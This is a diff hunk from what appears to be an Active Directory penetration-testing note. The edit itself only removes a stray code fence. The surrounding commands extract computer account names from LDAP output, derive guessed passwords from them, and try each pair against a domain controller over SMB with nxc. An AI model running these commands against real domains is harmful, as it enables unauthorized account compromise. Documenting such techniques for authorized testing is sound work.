@@ -73,6 +73,5 @@ cat results.txt | grep "sAMAccountName" | awk '{print $4}' | tee computers.txt
 cat results.txt | grep "sAMAccountName" | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt
 
 # 4. Brute-force line by line (user1:password1, user2:password2, ...)
-```
 nxc smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce
 ```
